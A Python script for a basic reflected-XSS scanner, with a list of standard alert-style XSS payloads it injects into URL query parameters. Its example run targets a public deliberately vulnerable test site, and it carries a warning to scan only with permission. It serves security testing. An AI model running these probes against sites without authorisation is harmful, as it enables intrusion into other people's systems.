import requests
from urllib.parse import urlparse, urljoin, parse_qs, urlencode

# --- XSS Payloads ---
# A list of common XSS payloads to test.
# These are basic examples; real-world XSS scanners use much more extensive lists.
XSS_PAYLOADS = [
    "<script>alert('XSS');</script>",
    "<img src=x onerror=alert('XSS');>",
    "<svg/onload=alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<body onload=alert('XSS')>",
    "<div onmouseover=alert('XSS')>Hover me</div>"
]

# --- Scanner Function ---
def scan_xss(url):
    """
    Performs a basic XSS scan on the given URL by injecting payloads into URL parameters.

    Args:
        url (str): The URL to scan.
    """
    print(f"[*] Scanning for XSS on: {url}")
    found_vulnerabilities = []

    # Parse the URL to get its components
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    original_query_params = parse_qs(parsed_url.query)

    # Iterate through each payload
    for payload in XSS_PAYLOADS:
        print(f"    [+] Testing payload: {payload[:50]}...") # Print first 50 chars of payload

        # Try injecting the payload into each existing query parameter
        for param_name in original_query_params:
            test_query_params = original_query_params.copy()
            test_query_params[param_name] = payload # Inject payload into the parameter

            # Reconstruct the URL with the new query parameters
            encoded_query = urlencode(test_query_params, doseq=True)
            test_url = f"{base_url}?{encoded_query}"

            try:
                # Make the HTTP GET request
                response = requests.get(test_url, timeout=10)
                response_text = response.text

                # Check if the payload is reflected in the response
                if payload in response_text:
                    vulnerability_info = {
                        "url": test_url,
                        "payload": payload,
                        "reflection_point": f"Parameter: {param_name}"
                    }
                    found_vulnerabilities.append(vulnerability_info)
                    print(f"        [!!!] Potential XSS vulnerability found!")
                    print(f"              URL: {test_url}")
                    print(f"              Payload: {payload}")
                    print(f"              Reflected in: {response.status_code} response body.")
                    # Break here if you only want to find one vulnerability per URL/payload combination
                    # or continue to find all possible reflections.
                    break # Move to next payload after finding one reflection for this payload
            except requests.exceptions.RequestException as e:
                print(f"        [ERROR] Request failed for {test_url}: {e}")
            except Exception as e:
                print(f"        [ERROR] An unexpected error occurred: {e}")

    if not found_vulnerabilities:
        print("[*] No obvious XSS vulnerabilities found with the tested payloads.")
    else:
        print("\n[--- SCAN COMPLETE ---]")
        print("[!!!] Summary of Potential XSS Vulnerabilities Found:")
        for vuln in found_vulnerabilities:
            print(f"- URL: {vuln['url']}")
            print(f"  Payload: {vuln['payload']}")
            print(f"  Location: {vuln['reflection_point']}\n")

# --- Main Execution ---
if __name__ == "__main__":
    # Example Usage:
    # Replace with the URL you want to scan.
    # For testing, you might use a known vulnerable test site or a simple local server.
    # Example of a URL with a parameter: "http://example.com/search?query=test"
    # Example of a URL without initial parameters: "http://example.com/"

    # IMPORTANT: Only scan websites you have explicit permission to scan.
    # Unauthorized scanning is illegal and unethical.
    
    # Example 1: A URL with an existing parameter
    target_url_1 = "http://testphp.vulnweb.com/listproducts.php?cat=1"
    scan_xss(target_url_1)

    print("\n" + "="*50 + "\n") # Separator

    # Example 2: A URL without initial parameters (the scanner won't inject into non-existent params)
    # This scanner primarily focuses on injecting into *existing* URL parameters.
    # For more advanced scanning, you'd need to identify input fields, forms, headers etc.
    target_url_2 = "http://example.com" # This will likely not find anything as it has no parameters
    # scan_xss(target_url_2) # Uncomment to run this example

    # Example 3: A URL that might reflect input (replace with a URL you control for testing)
    # target_url_3 = "http://your-test-site.com/reflect.php?input=hello"
    # scan_xss(target_url_3) # Uncomment to run this example
